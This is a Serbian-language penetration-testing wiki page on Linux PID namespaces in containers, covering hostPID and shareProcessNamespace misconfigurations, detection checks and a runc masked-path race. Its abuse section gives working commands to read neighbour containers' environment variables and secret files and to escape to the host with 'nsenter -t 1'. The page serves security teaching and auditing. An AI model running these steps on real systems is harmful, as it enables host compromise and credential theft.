# PID namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

PID namespace kontroliše način numerisanja procesa i procese koji su vidljivi. Zato container može imati sopstveni PID 1 iako nije stvarna mašina. Unutar namespace-a, workload vidi ono što izgleda kao lokalno stablo procesa. Izvan namespace-a, host i dalje vidi stvarne PID-ove hosta i kompletnu sliku procesa.<sup>[[3]](#references)</sup>

Sa bezbednosne tačke gledišta, PID namespace je važan zato što je vidljivost procesa vredna. Kada workload može da vidi procese hosta, možda može da posmatra nazive servisa, argumente komandne linije, secrets prosleđene u argumentima procesa, stanje izvedeno iz okruženja kroz `/proc` i potencijalne ciljeve za ulazak u namespace. Ako može da uradi više od samog posmatranja tih procesa, na primer da šalje signale ili koristi ptrace pod odgovarajućim uslovima, problem postaje mnogo ozbiljniji.

## Rad

Novi PID namespace počinje sa sopstvenim internim numerisanjem procesa. Prvi proces kreiran unutar njega postaje PID 1 iz perspektive tog namespace-a, što takođe znači da dobija posebnu init-like semantiku za orphaned children i ponašanje signala. Ovo objašnjava mnoge neobičnosti container-a u vezi sa init procesima, uklanjanjem zombie procesa i razlogom zbog kog se mali init wrappers ponekad koriste u container-ima.<sup>[[3]](#references)</sup>

PID namespace-ovi formiraju hijerarhiju. Proces u ancestor namespace-u može adresirati descendants koristeći PID dodeljen u tom ancestor-u, ali descendant ne može adresirati tasks koji postoje samo u ancestor-u kroz uobičajene PID-based syscalls niti može koristiti `setns()` za kretanje naviše u ancestor PID namespace. Procfs kojim upravlja ancestor, a koji je namerno izložen descendant-u, i dalje može da leak-uje prikaz procesa ancestor-a. Takođe, pridruživanje PID namespace-u pomoću `setns()` menja namespace za **buduću decu**, a ne za samog pozivaoca; zato tools nakon pridruživanja kreiraju fork. Procfs mount zadržava PID prikaz procesa koji ga je mount-ovao, zbog čega je kreiranje novog procfs-a nakon `unshare(CLONE_NEWPID)` bezbednosno relevantno, a ne samo kozmetičko.<sup>[[3]](#references)</sup>

Važna bezbednosna pouka jeste da proces može izgledati izolovano zato što vidi samo svoje PID stablo, ali ta izolacija može biti namerno uklonjena. Docker ovo izlaže kroz `--pid=host`, dok Kubernetes to radi pomoću `hostPID: true`. Kada se container pridruži PID namespace-u hosta, workload direktno vidi procese hosta, a mnogi kasniji attack paths postaju mnogo realističniji.

## Lab

Za ručno kreiranje PID namespace-a:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell sada vidi privatni prikaz procesa. Flag `--mount-proc` je važan zato što montira instancu procfs-a koja odgovara novom PID namespace-u, čime lista procesa iznutra postaje koherentna.<sup>[[3]](#references)</sup>

Radi poređenja ponašanja containera:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Razlika je neposredna i lako razumljiva, zbog čega je ovo dobra prva laboratorijska vežba za čitaoce.

## Upotreba u runtime-u

Normalni kontejneri u Docker-u, Podman-u, containerd-u i CRI-O-u dobijaju sopstveni PID namespace. Kubernetes kontejneri obično imaju odvojene prikaze PID-ova; `shareProcessNamespace: true` namerno kreira prikaz zajednički za ceo Pod.<sup>[[4]](#references)</sup> Nasuprot tome, `hostPID: true` bira PID namespace node-a. LXC/Incus okruženja se oslanjaju na isti kernel primitive, iako slučajevi upotrebe system-container-a mogu izložiti složenija stabla procesa i podstaći više prečica za debugging.

Isto pravilo važi svuda: ako runtime odluči da ne izoluje PID namespace, to predstavlja namerno smanjenje granice kontejnera.

## Pogrešne konfiguracije

Kanonska pogrešna konfiguracija je deljenje host PID namespace-a. Timovi to često opravdavaju praktičnošću za debugging, monitoring ili upravljanje servisima, ali to uvek treba tretirati kao značajan security izuzetak. Čak i ako kontejner nema neposredni write primitive nad host procesima, sama vidljivost može otkriti mnogo toga o sistemu. Kada se dodaju capability-ji kao što su `CAP_SYS_PTRACE` ili koristan procfs pristup, rizik se značajno povećava.

Druga greška je pretpostavka da je deljenje host PID namespace-a bezopasno zato što workload podrazumevano ne može da ubije host procese niti da nad njima koristi ptrace. Takav zaključak zanemaruje vrednost enumeration-a, dostupnost targeta za ulazak u namespace i način na koji se vidljivost PID-ova kombinuje sa drugim oslabljenim kontrolama.

### Kubernetes Pod-wide deljenje procesa

`shareProcessNamespace: true` se razlikuje od `hostPID`: ono izlaže procese **drugih kontejnera u istom Pod-u**, a ne procese node-a. Kompromitovani sidecar ili debug kontejner tada može da izlista command line-ove i podatke iz environment-a susednih kontejnera, u skladu sa procfs proverama pristupa, da šalje signal-e kada credentials to dozvoljavaju i da pristupi filesystem-u susednog kontejnera kroz `/proc/<pid>/root`. Kubernetes izričito upozorava da su command-line/environment secrets i filesystem-i kontejnera tada zaštićeni samo primenljivim Unix permissions.<sup>[[4]](#references)</sup>

Korisna provera sa strane clustera:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Iz kompromitovanog containera u Pod-wide PID namespace-u, prvo testirajte stvarni pristup umesto da pretpostavite da vidljivost znači i čitljivost:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## Zloupotreba

Ako je host PID namespace deljen, attacker može da pregleda host procese, prikupi argumente procesa, identifikuje zanimljive servise, pronađe odgovarajuće PID-ove za `nsenter` ili kombinuje vidljivost procesa sa privilegijama povezanim sa `ptrace` kako bi ometao host ili susedna opterećenja. U nekim slučajevima, samo uočavanje odgovarajućeg dugotrajno aktivnog procesa dovoljno je da promeni ostatak plana napada.

Prvi praktični korak je uvek potvrditi da su host procesi zaista vidljivi:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Kada PID-ovi hosta postanu vidljivi, argumenti procesa i ciljevi ulaska u namespace često postaju najkorisniji izvor informacija:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Ako je `nsenter` dostupan i postoje dovoljne privilegije, proverite da li vidljivi proces hosta može da se koristi kao most između namespace-ova:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Čak i kada je ulazak blokiran, deljenje host PID-ova je već korisno jer otkriva raspored servisa, komponente runtime-a i potencijalne privilegovane procese koje je moguće sledeće napasti. Sama vidljivost PID-ova **ne** daje dozvolu za slanje signala, praćenje, čitanje osetljivih `/proc/<pid>` unosa niti za pridruživanje drugim namespace-ovima cilja; kredencijali, dumpability, capabilities u user namespace-u koji poseduje ciljni namespace, Yama/LSM policy i seccomp i dalje imaju značaj.<sup>[[3]](#references)</sup> Pogledajte [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) za primere process-injection-a.

Vidljivost host PID-ova takođe čini zloupotrebu file descriptor-a realističnijom. Ako privilegovani host proces ili susedni workload ima otvoren osetljiv fajl ili socket, napadač možda može da pregleda `/proc/<pid>/fd/` i pristupi osnovnom objektu, u zavisnosti od ptrace-style provera, vlasništva, procfs mount opcija, tipa objekta i modela ciljnog servisa. Samo prikazivanje FD symlink-a ne znači da ga je moguće otvoriti, a socket se ne može duplicirati samo otvaranjem njegovog `/proc/<pid>/fd/N` symlink-a. Za zaseban `pidfd_getfd()` primitive i njegove authorization provere pogledajte [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ove komande su korisne jer pokazuju da li `hidepid=1` ili `hidepid=2` smanjuje vidljivost između procesa i da li su očigledno zanimljivi deskriptori, kao što su otvoreni fajlovi sa tajnama, logovi ili Unix socketi, uopšte vidljivi.

### Potpun primer: host PID + `nsenter`

Deljenje host PID-ova postaje direktan host escape kada proces ima i dovoljno privilegija da se pridruži host namespace-ovima:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ako komanda uspe, proces kontejnera sada se izvršava u host mount, UTS, network, IPC i PID namespaces. Posledice su trenutna kompromitacija hosta.

Čak i kada `nsenter` nedostaje, isti rezultat se može postići putem host binary-ja ako je host filesystem montiran:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Najnovije napomene o runtime-u

Neki napadi relevantni za PID namespace nisu tradicionalne pogrešne konfiguracije `hostPID: true`, već greške u implementaciji runtime-a povezane sa načinom na koji se procfs zaštite primenjuju tokom podešavanja containera.

#### Race u `maskedPaths` do host procfs-a

U ranjivim verzijama `runc`-a, napadači koji mogu da kontrolišu container image ili workload za `runc exec` mogli su da izazovu race tokom faze maskiranja tako što bi zamenili `/dev/null` na strani containera simboličkom vezom ka osetljivoj procfs putanji, kao što je `/proc/sys/kernel/core_pattern`. Ako bi race uspeo, bind mount maskirane putanje mogao bi da završi na pogrešnom odredištu i izloži host-globalne procfs parametre novom containeru.<sup>[[1]](#references)</sup>

Korisna komanda za proveru:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Ovo je važno zato što konačni uticaj može biti isti kao kod direktne izloženosti procfs-a: upisivi `core_pattern` ili `sysrq-trigger`, praćeni izvršavanjem koda na hostu ili uskraćivanjem usluge. Posebne stranice za [masked paths](../masked-paths.md) i [sensitive host mounts](../../sensitive-host-mounts.md) obrađuju opštu attack surface procfs-a bez njenog ponavljanja ovde.

#### Namespace injection sa `insject`

Alati za Namespace injection, kao što je `insject`, pokazuju da interakcija sa PID namespace-om ne zahteva uvek prethodni ulazak u ciljni namespace pre kreiranja procesa. Pomoćni proces može naknadno da se prikači, koristi `setns()` i izvršava se uz očuvanu vidljivost ciljnog PID prostora:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Ova vrsta tehnike je najvažnija za napredno debugging, offensive tooling i post-exploitation workflow-e, gde se namespace context mora pridružiti nakon što je runtime već inicijalizovao workload.

### Povezani obrasci zloupotrebe FD-a

Vredi eksplicitno istaći dva obrasca kada su host PID-ovi vidljivi. Prvo, privileged proces može zadržati osetljiv file descriptor otvorenim tokom `execve()`, jer nije označen sa `O_CLOEXEC`. Drugo, servisi mogu prosleđivati file descriptor-e preko Unix socket-a koristeći `SCM_RIGHTS`. U oba slučaja zanimljiv objekat više nije pathname, već već otvoreni handle koji proces sa nižim privilegijama može naslediti ili primiti.

Ovo je važno u radu sa container-ima zato što handle može pokazivati na `docker.sock`, privileged log, host secret file ili drugi objekat visoke vrednosti, čak i kada sam path nije direktno dostupan iz container filesystem-a.

## Provere

Svrha ovih komandi je da utvrde da li proces ima privatni PID view ili već može da nabroji znatno širi process landscape.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
Šta je ovde zanimljivo:<sup>[[3]](#references)</sup>

- Ako lista procesa sadrži očigledne host servise, deljenje host PID-ova je verovatno već aktivno.
- Videti samo malo stablo lokalno u containeru predstavlja uobičajenu početnu osnovu; prisustvo `systemd`, `dockerd` ili nepovezanih daemona nije uobičajeno.
- `NSpid` može otkriti mapiranje PID-ova kroz ugnježdene namespace-ove. Krajnja leva vrednost odnosi se na PID namespace povezan sa procfs mount-om, nakon čega slede vrednosti za sukcesivno ugnježdene namespace-ove.
- `readlink /proc/self/ns/pid` sam po sebi ne može dokazati `hostPID`: izolovani container takođe ima validan inode PID namespace-a. Povežite ga sa listom procesa, procfs mount-om, runtime konfiguracijom i inode-om namespace-a na hostu kada je dostupan.
- Kada host PID-ovi postanu vidljivi, čak i informacije o procesima dostupne samo za čitanje postaju korisne za reconnaissance.

Ako otkrijete container koji radi sa deljenjem host PID-ova, nemojte to tretirati kao kozmetičku razliku. To je velika promena u onome što workload može da posmatra i potencijalno na šta može da utiče.



## References

- [1] [runc security advisory: bekstvo iz containera putem zloupotrebe „masked path“ zbog race uslova pri mount-u (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Objava alata – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 book](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Deljenje Process Namespace-a između containera u Pod-u](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
